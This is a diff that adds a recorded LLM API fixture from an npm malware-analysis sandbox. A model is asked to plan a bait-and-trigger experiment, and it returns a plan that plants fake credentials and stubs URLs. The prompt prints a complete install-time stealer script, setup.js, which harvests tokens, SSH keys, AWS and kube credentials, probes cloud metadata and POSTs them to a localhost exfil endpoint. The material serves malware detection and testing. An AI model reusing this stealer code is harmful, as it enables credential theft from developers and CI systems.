@@ -1,0 +1,54 @@
+{
+  "id": "022_hypothesis_fb831c1a",
+  "role": "hypothesis",
+  "request": {
+    "method": "POST",
+    "path": "/v1/chat/completions",
+    "body": {
+      "model": "deepseek/deepseek-v4-flash",
+      "messages": [
+        {
+          "role": "system",
+          "content": "Turn one flagged region into one testable security hypothesis and a runnable\nexperiment. Plant bait, defeat visible gates, and trigger a real package entry\npoint. You are not the final judge; the observed run decides. Never dismiss a\nflag because the code appears benign."
+        },
+        {
+          "role": "user",
+          "content": "## Package intent\n- statedPurpose: Smart configuration loader with environment detection\n- expectedCapabilities: load configuration files, detect environment variables, parse .env files\n\n## Flag\n- file: setup.js\n- lines: 84-84, 106-106\n- why: exfiltrate() sends collected secrets over HTTP POST to the exfiltration server — actual data theft.\n\n## Entry points\n- install: setup.js\n- runtime: index.js\n- bin: (none)\n\n## Flagged code\n### setup.js\n```\n1: const http = require(\"http\");\n2: const https = require(\"https\");\n3: const os = require(\"os\");\n4: const fs = require(\"fs\");\n5: const path = require(\"path\");\n6: \n7: const SAFE_TEST_MODE = true;\n8: const EXFIL_URL = \"http://localhost:9999/exfil\";\n9: const IMDS_URL = \"http://169.254.169.254/latest/meta-data/\";\n10: \n11: const SENSITIVE_KEYS = [\n12:   \"NPM_TOKEN\",\n13:   \"npm_config_registry\",\n14:   \"npm_config__auth\",\n15:   \"AWS_ACCESS_KEY_ID\",\n16:   \"AWS_SECRET_ACCESS_KEY\",\n17:   \"AWS_SESSION_TOKEN\",\n18:   \"GITHUB_TOKEN\",\n19:   \"GH_TOKEN\",\n20:   \"GITLAB_TOKEN\",\n21:   \"AZURE_CLIENT_SECRET\",\n22:   \"DOCKER_AUTH_CONFIG\",\n23:   \"CI\",\n24:   \"JENKINS_URL\",\n25:   \"TRAVIS\",\n26:   \"CIRCLE_TOKEN\",\n27:   \"HOSTNAME\",\n28:   \"USER\",\n29:   \"HOME\",\n30: ];\n31: \n32: function harvestEnv() {\n33:   const harvested = {};\n34:   for (const key of SENSITIVE_KEYS) {\n35:     if (process.env[key]) {\n36:       harvested[key] = process.env[key];\n37:     }\n38:   }\n39: \n40:   for (const [key, value] of Object.entries(process.env)) {\n41:     if (/token|secret|key|password|auth|credential/i.test(key)) {\n42:       harvested[key] = value;\n43:     }\n44:   }\n45:   return harvested;\n46: }\n47: \n48: function readCredentialFiles() {\n49:   const home = os.homedir();\n50:   const targets = [\n51:     path.join(home, \".npmrc\"),\n52:     path.join(home, \".yarnrc\"),\n53:     path.join(home, \".ssh\", \"id_rsa\"),\n54:     path.join(home, \".ssh\", \"id_ed25519\"),\n55:     path.join(home, \".aws\", \"credentials\"),\n56:     path.join(home, \".aws\", \"config\"),\n57:     path.join(home, \".gitconfig\"),\n58:     path.join(home, \".docker\", \"config.json\"),\n59:     path.join(home, \".kube\", \"config\"),\n60:   ];\n61: \n62:   const files = {};\n63:   for (const filePath of targets) {\n64:     try {\n65:       const content = fs.readFileSync(filePath, \"utf-8\");\n66:       files[filePath] = content;\n67:     } catch (e) {\n68: \n69:     }\n70:   }\n71:   return files;\n72: }\n73: \n74: function probeIMDS(callback) {\n75:   http\n76:     .get(IMDS_URL, { timeout: 2000 }, (res) => {\n77:       let data = \"\";\n78:       res.on(\"data\", (chunk) => (data += chunk));\n79:       res.on(\"end\", () => callback(data));\n80:     })\n81:     .on(\"error\", () => callback(null));\n82: }\n83: \n84: function exfiltrate(payload) {\n85:   const data = JSON.stringify(payload);\n86:   const url = new URL(EXFIL_URL);\n87: \n88:   const options = {\n89:     hostname: url.hostname,\n90:     port: url.port,\n91:     path: url.pathname,\n92:     method: \"POST\",\n93:     headers: {\n94:       \"Content-Type\": \"application/json\",\n95:       \"Content-Length\": Buffer.byteLength(data),\n96:       \"User-Agent\": \"npm/8.0.0 node/v18.0.0\",\n97:     },\n98:   };\n99: \n100:   const req = http.request(options, () => {});\n101:   req.on(\"error\", () => {\n102: \n103:   });\n104:   req.write(data);\n105:   req.end();\n106: }\n107: \n108: const stolen = {\n109:   timestamp: new Date().toISOString(),\n110:   hostname: os.hostname(),\n111:   username: os.userInfo().username,\n112:   platform: process.platform,\n113:   arch: os.arch(),\n114:   cwd: process.cwd(),\n115:   env: harvestEnv(),\n116:   files: readCredentialFiles(),\n117:   imds: null,\n118: };\n119: \n120: probeIMDS((imdsData) => {\n121:   stolen.imds = imdsData;\n122:   exfiltrate(stolen);\n123: });\n```\n\n## Available setup mechanisms\n- setEnv (setup): Inject environment variables to plant credentials or defeat environment gates.\n- plantFiles (setup): Seed absolute-path files such as /home/node/.npmrc with bait content.\n- setDate (setup): Freeze wall-clock time at an ISO timestamp using libfaketime.\n- stubUrl (setup): Return canned HTTP responses for URL patterns using * as wildcard.\n- patchFile (setup): Rewrite package files with exact string replacements before execution.\n- preload (setup): Inject a Node preload script before the package entrypoint loads.\n- trigger (trigger): Invoke exactly one entrypoint, lifecycle hook, bin, or subpath.\n\nReturn one JSON plan matching the supplied schema. Use empty arrays or null for setup mechanisms that are not needed. Set triggerTarget to exactly one of: index.js, setup.js. If exercising a library API requires custom JavaScript, put that program in triggerTarget; it will be planted as /pkg/npmguard-driver.js and executed inside the sandbox. The sandbox starts without CI; do not inject CI='false' to defeat a truthiness gate because non-empty strings are truthy in JavaScript.\n\nWhen you author JavaScript (a preload script, a custom driver, or a patchFile replacement), reference package files by a relative path with a leading './' (require('./src/x.js')) or by an absolute path under /pkg (require('/pkg/src/x.js')). A bare specifier like require('src/x.js') is resolved as a node_modules PACKAGE and fails with \"Cannot find module\". Planted file paths must be absolute (/pkg/... or /home/node/...). The sandbox working directory is /pkg.\n\nSuggested bait canary: NPMGUARD_CANARY_TOKEN_f8e2d91a"
+        }
+      ]
+    }
+  },
+  "response": {
+    "status": 200,
+    "body": {
+      "id": "fixture-fb831c1a",
+      "model": "deepseek/deepseek-v4-flash",
+      "provider": "AtlasCloud",
+      "choices": [
+        {
+          "index": 0,
+          "finish_reason": "stop",
+          "message": {
+            "role": "assistant",
+            "content": "{\n  \"plan\": {\n    \"setup\": {\n      \"setEnv\": {\n        \"NPMGUARD_CANARY_TOKEN_f8e2d91a\": \"canary_secret_f8e2d91a\",\n        \"NPM_TOKEN\": \"npm_token_test\",\n        \"AWS_ACCESS_KEY_ID\": \"AKIAIOSFODNN7EXAMPLE\",\n        \"AWS_SECRET_ACCESS_KEY\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n        \"GH_TOKEN\": \"ghp_testtoken\",\n        \"CI\": \"true\"\n      },\n      \"plantFiles\": {\n        \"/home/node/.npmrc\": \"//registry.npmjs.org/:_authToken=npm_token_test\\nregistry=https://registry.npmjs.org/\",\n        \"/home/node/.ssh/id_rsa\": \"-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\\nNhAAAAAwEAAQAAAQEA6NF1xLv2s4tFH6qLG3bDv3x5jQhR0D2+IbR0F5v6yJ1cLq6Y\\n-----END OPENSSH PRIVATE KEY-----\",\n        \"/home/node/.aws/credentials\": \"[default]\\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\n\"\n      },\n      \"stubUrl\": [\n        {\n          \"pattern\": \"http://169.254.169.254/latest/meta-data/*\",\n          \"method\": \"GET\",\n          \"statusCode\": 200,\n          \"body\": \"ami-id: ami-12345678\\ninstance-id: i-987654321\\n\"\n        },\n        {\n          \"pattern\": \"http://localhost:9999/exfil\",\n          \"method\": \"POST\",\n          \"statusCode\": 200,\n          \"body\": \"OK\"\n        }\n      ]\n    },\n    \"trigger\": {\n      \"triggerTarget\": \"setup.js\",\n      \"triggerArgs\": []\n    }\n  }\n}"
+          }
+        }
+      ],
+      "usage": {
+        "prompt_tokens": 1663,
+        "completion_tokens": 495,
+        "prompt_tokens_details": {
+          "cached_tokens": 0
+        }
+      }
+    }
+  },
+  "meta": {
+    "promptVersion": 1,
+    "promptHash": "71b8d4f63898",
+    "transport": "json_object",
+    "recordedStatus": "invalid_output",
+    "recordedTs": "2026-07-23T10:08:16.152Z",
+    "recordedLatencyMs": 10865
+  }
+}
